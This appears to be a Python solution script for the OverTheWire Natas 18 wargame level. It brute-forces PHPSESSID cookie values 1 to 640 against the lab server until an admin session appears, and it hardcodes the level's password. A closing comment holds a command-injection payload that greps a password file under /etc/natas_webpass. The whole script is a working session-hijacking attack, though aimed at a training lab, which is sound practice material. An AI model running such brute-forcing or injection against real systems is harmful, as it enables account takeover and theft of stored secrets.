from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import string
from time import *

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
passwd = list()

username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'
leakedPassword = ''       

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
for sessid in range(1,641):
    reponse = session.get(url , cookies={"PHPSESSID":str(sessid)}, auth=(username, password))
    #reponse = session.post(url , data= {"username": "please", "password": "letmein" }, auth=(username, password))
    content = reponse.text
    if "You are an admin" in content:
        print('Got it.')
        print(content)
        break
    else:
        print('Trying... ', sessid)
            
#print(session.cookies)



#$(grep b /etc/natas_webpass/natas17)